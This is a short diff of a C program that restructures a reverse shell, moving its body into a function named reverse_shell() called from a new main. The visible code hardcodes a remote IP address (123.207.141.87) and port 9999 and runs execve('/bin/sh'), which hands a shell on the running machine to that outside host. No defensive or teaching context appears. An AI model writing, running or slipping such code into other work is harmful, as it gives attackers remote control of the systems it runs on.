@@ -11,7 +11,7 @@ int dup2(int oldfd, int newfd);
 int execve(const char *filename, char *const argv[], char *const envp[]);
 int close(int fd);
 
-int main()
+void reverse_shell()
 {
 	char* address = "123.207.141.87";
 	int port = 9999;
@@ -38,6 +38,14 @@ int main()
 	execve("/bin/sh", NULL, NULL);
 
 	close(sockfd);
+
+	return;
+}
+
+
+int main()
+{
+	reverse_shell();
 
 	return 0;
 }
